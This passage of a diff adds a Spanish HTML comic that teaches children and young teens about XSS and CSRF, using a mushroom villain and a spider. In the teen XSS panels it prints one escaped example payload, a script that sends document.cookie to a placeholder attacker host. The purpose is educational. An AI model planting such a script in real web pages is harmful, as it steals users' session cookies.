@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🍄 El Reino de los Hongos Digitales</title>
+<link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;600;700&family=Nunito:wght@400;700;900&family=Baloo+2:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --sage:    #8faf7e;
+  --moss:    #5a7a4a;
+  --sky:     #a8d8ea;
+  --blush:   #f4a9b0;
+  --peach:   #f9d4a0;
+  --lilac:   #c9b8e8;
+  --cream:   #fdf6ec;
+  --sand:    #e8dcc8;
+  --rust:    #c0613a;
+  --teal:    #5bbfb5;
+  --ink:     #3a2e28;
+  --soft-ink:#6b5a52;
+  --mushroom:#d4956a;
+  --mode-kids: #ff9f43;
+  --mode-teen: #5b6abf;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--cream);
+  font-family: 'Nunito', sans-serif;
+  color: var(--ink);
+  overflow-x: hidden;
+  transition: background 0.4s;
+}
+
+/* ══ MODE SWITCHER ══ */
+.mode-bar {
+  position: sticky; top: 0; z-index: 100;
+  display: flex; align-items: center; justify-content: center; gap: 0;
+  background: rgba(253,246,236,0.96);
+  backdrop-filter: blur(10px);
+  padding: 10px 20px;
+  border-bottom: 2px solid var(--sand);
+  box-shadow: 0 2px 16px rgba(0,0,0,0.06);
+}
+.mode-label {
+  font-family: 'Baloo 2', cursive;
+  font-size: 0.82rem;
+  font-weight: 600;
+  color: var(--soft-ink);
+  margin: 0 12px;
+}
+.mode-btn {
+  padding: 8px 22px;
+  border: 2.5px solid transparent;
+  border-radius: 50px;
+  font-family: 'Baloo 2', cursive;
+  font-weight: 800;
+  font-size: 0.88rem;
+  cursor: pointer;
+  transition: all 0.25s;
+  display: flex; align-items: center; gap: 6px;
+}
+.mode-btn.kids {
+  background: #fff3e0;
+  border-color: var(--mode-kids);
+  color: var(--mode-kids);
+}
+.mode-btn.teen {
+  background: #eef0fb;
+  border-color: var(--mode-teen);
+  color: var(--mode-teen);
+}
+.mode-btn.active-kids { background: var(--mode-kids); color: #fff; }
+.mode-btn.active-teen { background: var(--mode-teen); color: #fff; }
+.sound-btn {
+  margin-left: 14px; padding: 8px 16px;
+  border: 2.5px solid var(--sand); border-radius: 50px;
+  background: #fff; font-family: 'Baloo 2', cursive;
+  font-weight: 800; font-size: 0.82rem; color: var(--soft-ink);
+  cursor: pointer; transition: all 0.2s;
+}
+.sound-btn:hover { border-color: var(--sage); color: var(--moss); transform: scale(1.05); }
+.sound-btn.sound-on { background: #e8f4e0; border-color: var(--sage); color: var(--moss); }
+
+/* hide/show layers */
+.for-teen { display: block; }
+.for-kids { display: none; }
+body.kids-mode .for-teen { display: none !important; }
+body.kids-mode .for-kids  { display: block !important; }
+body.kids-mode .txt-teen  { display: none !important; }
+body.kids-mode .txt-kids  { display: block !important; }
+body.teen-mode .txt-kids  { display: none !important; }
+body.teen-mode .txt-teen  { display: block !important; }
+
+/* ══ BOOK ══ */
+.book { max-width: 980px; margin: 0 auto; padding-bottom: 60px; }
+
+/* ══ COVER ══ */
+.cover {
+  position: relative; min-height: 440px;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  text-align: center; padding: 60px 24px 60px;
+  overflow: hidden;
+}
+.cover-bg {
+  position: absolute; inset: 0; z-index: 0;
+  background:
+    radial-gradient(ellipse 80% 60% at 50% 30%, #c8e6c9 0%, transparent 70%),
+    radial-gradient(ellipse 60% 50% at 20% 80%, #ffe0b2 0%, transparent 60%),
+    radial-gradient(ellipse 50% 40% at 80% 70%, #e1bee7 0%, transparent 55%),
+    linear-gradient(160deg, #e8f5e9 0%, #fff9e6 50%, #fce4ec 100%);
+}
+.cover::after {
+  content: ''; position: absolute; bottom: -2px; left: 0; right: 0;
+  height: 44px; background: var(--cream);
+  clip-path: ellipse(55% 100% at 50% 100%);
+}
+.cover-emoji { font-size: clamp(3.5rem,9vw,6rem); display: block; z-index:1; position:relative; animation: sway 4s ease-in-out infinite; }
+@keyframes sway { 0%,100%{transform:rotate(-3deg) scale(1)} 50%{transform:rotate(3deg) scale(1.05)} }
+
+.cover-title {
+  font-family: 'Baloo 2', cursive; font-weight: 800;
+  font-size: clamp(2.2rem,7vw,5rem); color: var(--moss);
+  line-height: 1.1; z-index:1; position:relative;
+  text-shadow: 2px 3px 0 rgba(255,255,255,.7);
+}
+.cover-sub {
+  font-family: 'Caveat', cursive; font-size: clamp(1.1rem,3vw,1.8rem);
+  color: var(--soft-ink); margin-top:8px; z-index:1; position:relative;
+}
+.age-badges {
+  display: flex; gap: 10px; justify-content: center; margin-top: 16px;
+  z-index:1; position:relative; flex-wrap:wrap;
+}
+.age-badge {
+  padding: 7px 20px; border-radius: 50px; font-family:'Baloo 2',cursive;
+  font-weight:800; font-size:0.9rem; border:2.5px solid; cursor:pointer;
+  transition: all .25s;
+}
+.age-badge.kids { background:#fff3e0; border-color:var(--mode-kids); color:var(--mode-kids); }
+.age-badge.teen { background:#eef0fb; border-color:var(--mode-teen); color:var(--mode-teen); }
+.age-badge:hover { transform:scale(1.06); }
+
+/* ══ CHAPTER HEADERS ══ */
+.chapter-header { text-align:center; padding:32px 20px 10px; }
+.chapter-icon { font-size:3rem; display:block; margin-bottom:6px; }
+.chapter-label {
+  font-family:'Baloo 2',cursive; font-weight:800;
+  font-size:clamp(1.5rem,5vw,2.8rem); line-height:1.2;
+}
+.chapter-label.green { color:var(--moss); }
+.chapter-label.rust  { color:var(--rust); }
+.chapter-label.teal  { color:var(--teal); }
+.chapter-label.lilac { color:#7b5ea7; }
+.chapter-desc { font-size:.95rem; color:var(--soft-ink); margin-top:6px; max-width:540px; margin-left:auto; margin-right:auto; line-height:1.6; }
+.chapter-rule { width:80px; height:3px; border-radius:3px; margin:12px auto 0; }
+.chapter-rule.green { background:var(--sage); }
+.chapter-rule.rust  { background:var(--blush); }
+.chapter-rule.teal  { background:var(--teal); }
+.chapter-rule.lilac { background:var(--lilac); }
+
+/* ══ PANELS ══ */
+.panels { display:grid; gap:14px; padding:14px 20px; }
+.panels.two         { grid-template-columns:1fr 1fr; }
+.panels.three       { grid-template-columns:1fr 1fr 1fr; }
+.panels.wide-left   { grid-template-columns:2fr 1fr; }
+.panels.wide-right  { grid-template-columns:1fr 2fr; }
+.panels.one         { grid-template-columns:1fr; }
+
+.panel {
+  border-radius:22px; padding:20px;
+  position:relative; overflow:hidden;
+  min-height:160px; display:flex; flex-direction:column;
+  box-shadow:0 4px 18px rgba(90,70,60,.08);
+  transition:transform .25s, box-shadow .25s;
+}
+.panel:hover { transform:translateY(-3px) rotate(.4deg); box-shadow:0 8px 28px rgba(90,70,60,.14); }
+
+.p-sage     { background:linear-gradient(135deg,#eaf4e4,#d5eacb); }
+.p-sky      { background:linear-gradient(135deg,#dff2fb,#c8e8f5); }
+.p-peach    { background:linear-gradient(135deg,#fff3de,#fce8c0); }
+.p-blush    { background:linear-gradient(135deg,#fdeef0,#f9d5da); }
+.p-lilac    { background:linear-gradient(135deg,#f0ebfb,#dfd5f5); }
+.p-sand     { background:linear-gradient(135deg,#f5efe4,#ecddc8); }
+.p-teal     { background:linear-gradient(135deg,#dff6f4,#b8ece8); }
+.p-dark     { background:linear-gradient(135deg,#3a2e28,#2a2018); color:#f5efe4; }
+.p-rust     { background:linear-gradient(135deg,#fde8df,#f4c4b0); }
+.p-mushroom { background:linear-gradient(135deg,#fdecd6,#f5d4a8); }
+.p-kids-xss { background:linear-gradient(135deg,#ffe8e8,#ffd0c0); }
+.p-kids-csrf{ background:linear-gradient(135deg,#e8f4ff,#c8e4ff); }
+
+/* watercolor tint */
+.panel::before {
+  content:''; position:absolute; inset:-20px; opacity:.22;
+  border-radius:50%; pointer-events:none;
+}
+.p-sage::before   { background:radial-gradient(circle at 30% 30%,#b8dfa8,transparent 65%); }
+.p-blush::before  { background:radial-gradient(circle at 70% 60%,#f9b8c0,transparent 65%); }
+.p-sky::before    { background:radial-gradient(circle at 40% 70%,#9fd4ee,transparent 65%); }
+.p-teal::before   { background:radial-gradient(circle at 60% 40%,#78d8d0,transparent 65%); }
+.p-lilac::before  { background:radial-gradient(circle at 50% 50%,#c4a8f0,transparent 65%); }
+.p-kids-xss::before { background:radial-gradient(circle at 40% 40%,#ffb8a0,transparent 65%); }
+.p-kids-csrf::before{ background:radial-gradient(circle at 60% 60%,#a8c8ff,transparent 65%); }
+
+.p-num { font-family:'Caveat',cursive; font-size:.82rem; font-weight:700; color:rgba(90,70,60,.3); position:absolute; top:10px; right:14px; }
+.p-dark .p-num { color:rgba(255,255,255,.22); }
+
+/* ══ SCENE TAGS ══ */
+.scene-tag {
+  font-family:'Baloo 2',cursive; font-size:.75rem; font-weight:700;
+  letter-spacing:1.2px; text-transform:uppercase; padding:3px 10px;
+  border-radius:20px; display:inline-block; margin-bottom:8px; position:relative; z-index:1;
+}
+.tag-green  { background:#c8e6b8; color:var(--moss); }
+.tag-rust   { background:#f9d0c4; color:var(--rust); }
+.tag-sky    { background:#c2e8f8; color:#2a6e8a; }
+.tag-teal   { background:#b8ece8; color:#2a7a74; }
+.tag-lilac  { background:#ddd0f8; color:#5a3a9a; }
+.tag-dark   { background:rgba(255,255,255,.15); color:#f5efe4; }
+.tag-peach  { background:#fce8b8; color:#8a5a10; }
+.tag-orange { background:#ffe0c0; color:#c05000; }
+
+/* ══ CHARACTERS ══ */
+.char {
+  font-size:clamp(2.5rem,6vw,4rem); display:block;
+  text-align:center; line-height:1; position:relative; z-index:1;
+  filter:drop-shadow(1px 2px 3px rgba(0,0,0,.12));
+}
+.char.sm  { font-size:clamp(1.8rem,4vw,2.8rem); }
+.char.lg  { font-size:clamp(3.5rem,8vw,5.5rem); }
+.char.xl  { font-size:clamp(4rem,10vw,7rem); }
+.char.anim-float  { animation:float  3.5s ease-in-out infinite; }
+.char.anim-pulse  { animation:pulse  2s   ease-in-out infinite; }
+.char.anim-wobble { animation:wobble 2.5s ease-in-out infinite; }
+.char.anim-spin   { animation:spin   4s   linear     infinite; }
+@keyframes float  { 0%,100%{transform:translateY(0)}  50%{transform:translateY(-10px)} }
+@keyframes pulse  { 0%,100%{transform:scale(1)}        50%{transform:scale(1.08)} }
+@keyframes wobble { 0%,100%{transform:rotate(0)}       25%{transform:rotate(-6deg)} 75%{transform:rotate(6deg)} }
+@keyframes spin   { from{transform:rotate(0)} to{transform:rotate(360deg)} }
+
+/* ══ BUBBLES ══ */
+.bubble {
+  font-family:'Caveat',cursive; font-size:clamp(.95rem,2.5vw,1.15rem);
+  font-weight:600; line-height:1.5; background:rgba(255,255,255,.88);
+  border:2px solid rgba(90,70,60,.18); border-radius:18px; padding:10px 14px;
+  position:relative; z-index:2; color:var(--ink); margin-top:8px;
+  backdrop-filter:blur(2px); box-shadow:0 2px 8px rgba(0,0,0,.07);
+}
+.bubble.villain { background:rgba(60,30,20,.88); border-color:rgba(200,80,60,.5); color:#fdddd0; }
+.bubble.info    { background:rgba(200,235,255,.85); border-color:rgba(90,190,180,.4); color:#1a4a5a; }
+.bubble.tip     { background:rgba(210,240,200,.9); border-color:rgba(100,170,80,.4); color:#2a5a1a; }
+.bubble.big-kids { font-size:clamp(1.1rem,3.5vw,1.5rem); padding:12px 18px; }
+.bubble::after  { content:''; position:absolute; bottom:-11px; left:22px; width:16px; height:12px; background:inherit; clip-path:polygon(0 0,100% 0,50% 100%); }
+.bubble.right::after { left:auto; right:22px; }
+.bubble.notail::after { display:none; }
+
+/* ══ TEXT ══ */
+.txt { font-size:clamp(.85rem,2vw,.97rem); line-height:1.65; color:var(--soft-ink); position:relative; z-index:1; margin-top:8px; }
+.txt.dark { color:#d4c8b8; }
+.txt b { color:var(--ink); }
+.txt.dark b { color:#f0e0d0; }
+/* kids text is bigger and simpler */
+.txt-kids { font-size:clamp(1rem,3vw,1.2rem); line-height:1.8; color:var(--soft-ink); position:relative; z-index:1; margin-top:8px; font-weight:700; font-family:'Baloo 2',cursive; }
+.txt-teen { font-size:clamp(.83rem,2vw,.96rem); line-height:1.65; color:var(--soft-ink); position:relative; z-index:1; margin-top:8px; }
+
+/* ══ CAPTION BOX ══ */
+.caption-box { border-left:4px solid; padding:10px 14px; border-radius:0 12px 12px 0; position:relative; z-index:1; margin:10px 0; font-size:.88rem; font-weight:700; line-height:1.5; }
+.cap-green { border-color:var(--sage); background:rgba(143,175,126,.12); color:var(--moss); }
+.cap-rust  { border-color:var(--rust); background:rgba(192,97,58,.10); color:var(--rust); }
+.cap-teal  { border-color:var(--teal); background:rgba(91,191,181,.12); color:#2a7a74; }
+.cap-lilac { border-color:#9b7dd4; background:rgba(155,125,212,.12); color:#5a3a9a; }
+
+/* ══ CODE ══ */
+.code { font-family:'Courier New',monospace; font-size:.78rem; background:rgba(30,20,15,.88); color:#f4a070; border-radius:10px; padding:10px 12px; line-height:1.7; margin:8px 0; position:relative; z-index:1; border:1.5px solid rgba(200,100,60,.3); word-break:break-all; }
+.code.safe { color:#7edc7e; border-color:rgba(80,180,80,.3); }
+
+/* ══ SFX ══ */
+.sfx { font-family:'Baloo 2',cursive; font-weight:800; text-align:center; line-height:1; display:block; position:relative; z-index:1; }
+.sfx.lg { font-size:clamp(2rem,6vw,4rem); }
+.sfx.md { font-size:clamp(1.4rem,4vw,2.5rem); }
+.sfx.rust  { color:var(--rust);  text-shadow:2px 2px 0 rgba(192,97,58,.2); }
+.sfx.teal  { color:var(--teal);  text-shadow:2px 2px 0 rgba(91,191,181,.2); }
+.sfx.moss  { color:var(--moss);  text-shadow:2px 2px 0 rgba(90,122,74,.2); }
+.sfx.cream { color:var(--cream); text-shadow:2px 2px 0 rgba(0,0,0,.3); }
+.sfx.lilac { color:#9b7dd4; }
+
+/* ══ KIDS STORY PANELS (big, simple, iconic) ══ */
+.kids-story {
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+  gap:16px; padding:14px 20px;
+}
+.kids-panel {
+  border-radius:28px; padding:24px 20px; text-align:center;
+  box-shadow:0 6px 24px rgba(0,0,0,.08); min-height:220px;
+  display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px;
+  transition:transform .25s;
+  border:3px solid transparent;
+}
+.kids-panel:hover { transform:scale(1.03); }
+.kids-panel.xss-k { background:linear-gradient(160deg,#ffe8e0,#ffd0c0); border-color:#f4a080; }
+.kids-panel.csrf-k{ background:linear-gradient(160deg,#e0eeff,#c0d8ff); border-color:#90b8f8; }
+.kids-panel.safe-k{ background:linear-gradient(160deg,#e0f8e8,#c0f0d0); border-color:#80d8a0; }
+.kids-icon { font-size:clamp(3.5rem,10vw,6rem); line-height:1; filter:drop-shadow(2px 3px 4px rgba(0,0,0,.1)); }
+.kids-title {
+  font-family:'Baloo 2',cursive; font-weight:800;
+  font-size:clamp(1.3rem,4vw,1.8rem); line-height:1.2;
+}
+.kids-title.rust  { color:var(--rust); }
+.kids-title.blue  { color:#3060c0; }
+.kids-title.green { color:var(--moss); }
+.kids-text { font-family:'Baloo 2',cursive; font-size:clamp(.95rem,2.5vw,1.1rem); line-height:1.7; color:var(--soft-ink); font-weight:600; }
+
+/* ══ STEP FLOW (kids) ══ */
+.step-flow { display:flex; flex-direction:column; gap:10px; padding:14px 20px; }
+.step-item {
+  display:flex; align-items:flex-start; gap:14px;
+  background:rgba(255,255,255,.75); border-radius:18px; padding:14px 16px;
+  box-shadow:0 2px 10px rgba(0,0,0,.06); border:2px solid transparent;
+  transition:transform .2s;
+}
+.step-item:hover { transform:translateX(4px); }
+.step-item.xss  { border-color:rgba(240,150,120,.4); }
+.step-item.csrf { border-color:rgba(120,160,240,.4); }
+.step-item.safe { border-color:rgba(100,200,140,.4); }
+.step-num { font-family:'Baloo 2',cursive; font-weight:800; font-size:1.5rem; min-width:42px; height:42px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.step-num.xss  { background:#fdd0c0; color:var(--rust); }
+.step-num.csrf { background:#c0d4ff; color:#3060c0; }
+.step-num.safe { background:#c0f0d0; color:var(--moss); }
+.step-body { flex:1; }
+.step-title { font-family:'Baloo 2',cursive; font-weight:800; font-size:1rem; margin-bottom:3px; }
+.step-desc  { font-size:.88rem; line-height:1.6; color:var(--soft-ink); }
+.step-emoji { font-size:2rem; flex-shrink:0; }
+
+/* ══ ANALOGY BOX ══ */
+.analogy-box {
+  margin:0 20px 14px; border-radius:20px; padding:20px;
+  display:flex; align-items:center; gap:16px; flex-wrap:wrap;
+  box-shadow:0 4px 16px rgba(0,0,0,.07);
+}
+.analogy-box.xss  { background:linear-gradient(135deg,#fff0eb,#fde0d0); border:2px solid rgba(200,100,60,.2); }
+.analogy-box.csrf { background:linear-gradient(135deg,#eef3ff,#d8e8ff); border:2px solid rgba(90,120,220,.2); }
+.analogy-icon { font-size:3.5rem; flex-shrink:0; }
+.analogy-text { flex:1; min-width:200px; }
+.analogy-title { font-family:'Baloo 2',cursive; font-weight:800; font-size:1.1rem; margin-bottom:6px; }
+.analogy-title.rust { color:var(--rust); }
+.analogy-title.blue { color:#3060c0; }
+.analogy-desc { font-size:.88rem; line-height:1.65; color:var(--soft-ink); }
+
+/* ══ COMPARE ══ */
+.compare-row { display:grid; grid-template-columns:1fr auto 1fr; gap:10px; align-items:center; padding:0 20px 10px; }
+.compare-vs  { font-family:'Baloo 2',cursive; font-size:2.2rem; font-weight:800; color:var(--sand); text-align:center; text-shadow:1px 2px 0 rgba(0,0,0,.1); }
+.compare-card { border-radius:18px; padding:16px; min-height:200px; box-shadow:0 4px 16px rgba(0,0,0,.08); }
+.compare-card.rust { background:linear-gradient(135deg,#fde8df,#f4c4b0); }
+.compare-card.teal { background:linear-gradient(135deg,#dff6f4,#b8ece8); }
+.compare-title { font-family:'Baloo 2',cursive; font-size:1.6rem; font-weight:800; margin-bottom:10px; }
+.compare-title.rust { color:var(--rust); }
+.compare-title.teal { color:#2a7a74; }
+.compare-list { list-style:none; font-size:.85rem; line-height:2; color:var(--soft-ink); }
+.compare-list li::before { content:'• '; opacity:.5; }
+
+/* ══ DEFENSE CARDS ══ */
+.defense-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:14px; padding:0 20px; }
+.defense-card { border-radius:18px; padding:18px; text-align:center; box-shadow:0 4px 16px rgba(0,0,0,.07); transition:transform .2s; }
+.defense-card:hover { transform:translateY(-4px); }
+.defense-card.sage  { background:linear-gradient(160deg,#e8f4e0,#d2e8c0); }
+.defense-card.sky   { background:linear-gradient(160deg,#dff2fb,#c2e4f5); }
+.defense-card.peach { background:linear-gradient(160deg,#fff3de,#fce4b8); }
+.defense-card.lilac { background:linear-gradient(160deg,#f0ebfb,#ddd0f5); }
+.defense-icon { font-size:2.5rem; display:block; margin-bottom:8px; }
+.defense-name { font-family:'Baloo 2',cursive; font-size:1.3rem; font-weight:800; margin-bottom:6px; }
+.defense-name.sage  { color:var(--moss); }
+.defense-name.sky   { color:#2a6e8a; }
+.defense-name.peach { color:#8a5a10; }
+.defense-name.lilac { color:#5a3a9a; }
+.defense-desc { font-size:.82rem; line-height:1.6; color:var(--soft-ink); }
+
+/* ══ CARD GRID ══ */
+.card-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:12px; margin-top:10px; position:relative; z-index:1; }
+.card { background:rgba(255,255,255,.7); border-radius:14px; padding:14px; border:1.5px solid rgba(90,70,60,.12); box-shadow:0 2px 10px rgba(0,0,0,.05); font-size:.85rem; line-height:1.55; }
+.card-icon { font-size:1.8rem; display:block; margin-bottom:6px; }
+.card-title { font-weight:900; font-size:.9rem; margin-bottom:4px; }
+
+/* ══ FINALE ══ */
+.finale {
+  margin:20px 20px 0; border-radius:24px; padding:40px 30px; text-align:center;
+  background:
+    radial-gradient(ellipse 70% 50% at 50% 0%,#d5f0e0,transparent 70%),
+    radial-gradient(ellipse 50% 40% at 10% 80%,#fde8df,transparent 60%),
+    radial-gradient(ellipse 40% 30% at 90% 60%,#ddf2fb,transparent 55%),
+    linear-gradient(170deg,#eaf4e2 0%,#fdf6ec 50%,#fce8f0 100%);
+  box-shadow:0 8px 40px rgba(0,0,0,.08); position:relative; overflow:hidden;
+}
+.finale-title { font-family:'Baloo 2',cursive; font-weight:800; font-size:clamp(2rem,6vw,4rem); color:var(--moss); text-shadow:2px 2px 0 rgba(255,255,255,.6); margin-bottom:8px; }
+.finale-sub   { font-size:.95rem; color:var(--soft-ink); max-width:500px; margin:0 auto 24px; line-height:1.7; }
+.tip-pills    { display:flex; flex-wrap:wrap; justify-content:center; gap:10px; margin-top:16px; }
+.pill { background:rgba(255,255,255,.8); border:2px solid rgba(90,122,74,.3); border-radius:50px; padding:7px 18px; font-size:.85rem; font-weight:700; color:var(--moss); backdrop-filter:blur(3px); }
+.pill.big { font-size:1rem; padding:9px 22px; font-family:'Baloo 2',cursive; font-weight:800; }
+
+/* ══ SCROLL REVEAL ══ */
+.reveal { opacity:0; transform:translateY(20px); transition:opacity .55s ease, transform .55s ease; }
+.reveal.visible { opacity:1; transform:translateY(0); }
+
+/* ══ RESPONSIVE ══ */
+@media(max-width:620px){
+  .panels.two,.panels.three,.panels.wide-left,.panels.wide-right { grid-template-columns:1fr; }
+  .compare-row { grid-template-columns:1fr; }
+  .compare-vs  { display:none; }
+}
+</style>
+</head>
+<body class="teen-mode">
+
+<!-- ══ MODE BAR ══ -->
+<div class="mode-bar">
+  <button class="mode-btn kids" id="btn-kids" onclick="setMode('kids')">🌈 Modo Pequeños (3–7)</button>
+  <span class="mode-label">Elige tu versión</span>
+  <button class="mode-btn teen active-teen" id="btn-teen" onclick="setMode('teen')">🔬 Modo Exploradores (8–14)</button>
+  <button class="sound-btn" id="sound-btn" onclick="toggleSound()">🔇 Sonido OFF</button>
+</div>
+
+<div class="book">
+
+<!-- ══ COVER ══ -->
+<div class="cover">
+  <div class="cover-bg"></div>
+  <span class="cover-emoji">🍄🌿✨</span>
+  <h1 class="cover-title">El Reino de los<br>Hongos Digitales</h1>
+  <p class="cover-sub">Una historia sobre secretos, trampas y guardianes mágicos</p>
+  <div class="age-badges">
+    <span class="age-badge kids" onclick="setMode('kids')">🌈 Para niños 3–7</span>
+    <span class="age-badge teen" onclick="setMode('teen')">🔬 Para exploradores 8–14</span>
+  </div>
+</div>
+
+<!-- ══ INTRO ══ -->
+<div class="chapter-header reveal">
+  <span class="chapter-icon">🌸</span>
+  <div class="chapter-label green">El jardín mágico de internet</div>
+  <p class="chapter-desc for-teen">Cada página web es un jardín lleno de flores-datos. Tu nombre, tu contraseña, tus fotos... todo vive ahí.</p>
+  <p class="chapter-desc for-kids" style="display:none">¿Sabes qué es internet? ¡Es como un jardín gigante con muchos castillos! Cada castillo guarda tus cosas especiales 🏰</p>
+  <div class="chapter-rule green"></div>
+</div>
+
+<!-- intro panels -->
+<div class="panels two reveal">
+  <div class="panel p-sage">
+    <span class="p-num">01</span>
+    <span class="scene-tag tag-green">La guardiana</span>
+    <span class="char lg anim-float">🧚</span>
+    <p class="txt-teen">Lila guarda su jardín digital con cuidado. Sus flores-datos son muy valiosas: su nombre de usuario, contraseña y puntos del juego favorito.</p>
+    <p class="txt-kids" style="display:none">¡Esta es Lila! Ella tiene un jardín mágico con flores muy especiales. Sus flores son sus juguetes digitales 🌸</p>
+  </div>
+  <div class="panel p-sky">
+    <span class="p-num">02</span>
+    <span class="scene-tag tag-sky">¿Cómo funciona?</span>
+    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;position:relative;z-index:1">
+      <span class="char sm">🧚</span>
+      <span style="font-size:1.4rem">→</span>
+      <span class="char sm">🦋</span>
+      <span style="font-size:1.4rem">→</span>
+      <span class="char sm">🏡</span>
+    </div>
+    <p class="txt-teen" style="margin-top:8px">Cuando visitas una web, tu navegador lleva una <b>semilla-cookie</b>: una tarjeta que dice "¡soy yo!". El servidor la reconoce y te abre las puertas.</p>
+    <p class="txt-kids" style="display:none;margin-top:8px">Cuando Lila quiere entrar a su castillo, manda una mariposa 🦋 con una tarjeta mágica que dice su nombre. ¡El castillo la reconoce!</p>
+  </div>
+</div>
+
+<!-- ══ XSS CHAPTER ══ -->
+<div class="chapter-header reveal">
+  <span class="chapter-icon">🍄</span>
+  <div class="chapter-label rust">Capítulo 1 — El Hongo Parásito</div>
+  <p class="chapter-desc for-teen">XSS (Cross-Site Scripting): esconder código peligroso dentro de mensajes normales</p>
+  <p class="chapter-desc for-kids" style="display:none">Un hongo malvado quiere entrar al jardín de Lila... ¡con un truco muy astuto!</p>
+  <div class="chapter-rule rust"></div>
+</div>
+
+<!-- Kids XSS simple story -->
+<div class="for-kids" style="display:none">
+  <div class="kids-story reveal">
+    <div class="kids-panel xss-k">
+      <span class="kids-icon anim-wobble">🦠</span>
+      <div class="kids-title rust">¡Es Moho!</div>
+      <div class="kids-text">Moho es un hongo malvado que quiere robar las flores de Lila. Pero no puede entrar al jardín directamente... 🌑</div>
+    </div>
+    <div class="kids-panel xss-k">
+      <span class="kids-icon">📋</span>
+      <div class="kids-title rust">El tablón mágico</div>
+      <div class="kids-text">En el jardín hay un tablón donde todos pueden dejar mensajes. Moho escribe uno que parece normal... ¡pero lleva una trampa escondida! 🍄</div>
+    </div>
+    <div class="kids-panel xss-k">
+      <span class="kids-icon anim-pulse">😱</span>
+      <div class="kids-title rust">¡La trampa explota!</div>
+      <div class="kids-text">Cuando Lila lee el mensaje, ¡la trampa se activa sola! Roba la tarjeta mágica de Lila y se la manda a Moho. 💔</div>
+    </div>
+  </div>
+  <div class="analogy-box xss reveal">
+    <span class="analogy-icon">🍭</span>
+    <div class="analogy-text">
+      <div class="analogy-title rust">🌟 ¿Lo entiendes así?</div>
+      <div class="analogy-desc">Es como si alguien pusiera un chicle trampa en la pared del colegio. Cuando lo tocas sin querer... ¡te pega los dedos y te roba el estuche! Parece un chicle normal, pero tiene trampa. 😮</div>
+    </div>
+  </div>
+</div>
+
+<!-- Teen XSS detailed -->
+<div class="for-teen">
+  <div class="panels wide-right reveal">
+    <div class="panel p-dark">
+      <span class="p-num">03</span>
+      <span class="scene-tag tag-dark">El villano</span>
+      <span class="char xl anim-wobble">🦠</span>
+      <div class="sfx md cream" style="margin-top:6px">Moho el Parásito</div>
+      <div class="bubble villain notail" style="margin-top:10px">
+        Planto mis esporas de código donde nadie las ve... y cuando alguien pasa, ¡BOOM! 😈
+      </div>
+    </div>
+    <div class="panel p-blush">
+      <span class="p-num">04</span>
+      <span class="scene-tag tag-rust">¿Qué es XSS?</span>
+      <p class="txt"><b>XSS (Cross-Site Scripting)</b> ocurre cuando código malicioso se inyecta en una página web legítima. Cuando otro usuario visita esa página, el código se ejecuta en <b>su</b> navegador.</p>
+      <div class="caption-box cap-rust" style="margin-top:10px">
+        🍄 El tablón de anuncios acepta mensajes HTML. Moho escribe uno que parece texto, pero lleva una espora <code>&lt;script&gt;</code> oculta que el servidor guarda sin revisar.
+      </div>
+    </div>
+  </div>
+
+  <div class="panels three reveal">
+    <div class="panel p-peach">
+      <span class="p-num">05</span>
+      <span class="scene-tag tag-peach">Paso 1</span>
+      <span class="char anim-wobble">🦠</span>
+      <p class="txt">Moho escribe en el tablón de anuncios:</p>
+      <div class="code">
+&lt;script&gt;<br>
+  fetch('malo.com?c='+<br>
+  document.cookie);<br>
+&lt;/script&gt;
+      </div>
+      <div class="bubble villain" style="font-size:.88rem">¡Parece un comentario! 😏</div>
+    </div>
+    <div class="panel p-sand">
+      <span class="p-num">06</span>
+      <span class="scene-tag tag-peach">Paso 2</span>
+      <span class="char">🏡</span>
+      <p class="txt">El servidor guarda el mensaje <b>sin sanitizarlo</b>. No distingue entre texto inofensivo y código ejecutable.</p>
+      <span class="sfx md rust" style="margin-top:10px">¡Error del jardín! ⚠️</span>
+    </div>
+    <div class="panel p-blush">
+      <span class="p-num">07</span>
+      <span class="scene-tag tag-rust">Paso 3 — Ataque</span>
+      <span class="char anim-pulse">🧚</span>
+      <p class="txt">Lila visita el tablón. El navegador ejecuta el script: <b>lee la cookie de sesión</b> y la envía al servidor de Moho.</p>
+      <span class="sfx md rust" style="margin-top:8px">Cookie robada 😱</span>
+      <div class="bubble right" style="font-size:.85rem">¡Mis flores desaparecieron! 😢</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CSRF CHAPTER ══ -->
+<div class="chapter-header reveal">
+  <span class="chapter-icon">🕷️</span>
+  <div class="chapter-label teal">Capítulo 2 — La Araña Manipuladora</div>
+  <p class="chapter-desc for-teen">CSRF (Cross-Site Request Forgery): hacer que TÚ envíes órdenes sin saberlo</p>
+  <p class="chapter-desc for-kids" style="display:none">Una araña astuta quiere que Lila regale sus flores... ¡sin que ella lo sepa!</p>
+  <div class="chapter-rule teal"></div>
+</div>
+
+<!-- Kids CSRF simple story -->
+<div class="for-kids" style="display:none">
+  <div class="kids-story reveal">
+    <div class="kids-panel csrf-k">
+      <span class="kids-icon anim-float">🕷️</span>
+      <div class="kids-title blue">¡Es Tela!</div>
+      <div class="kids-text">Tela es una araña muy lista. Ella no roba nada directamente... ¡hace que TÚ lo regales sin darte cuenta! 🕸️</div>
+    </div>
+    <div class="kids-panel csrf-k">
+      <span class="kids-icon">💌</span>
+      <div class="kids-title blue">La carta trampa</div>
+      <div class="kids-text">Tela le manda a Lila una carta muy bonita: "¡Haz clic aquí para ganar flores mágicas gratis!" 🌸✨</div>
+    </div>
+    <div class="kids-panel csrf-k">
+      <span class="kids-icon anim-pulse">😤</span>
+      <div class="kids-title blue">¡El engaño!</div>
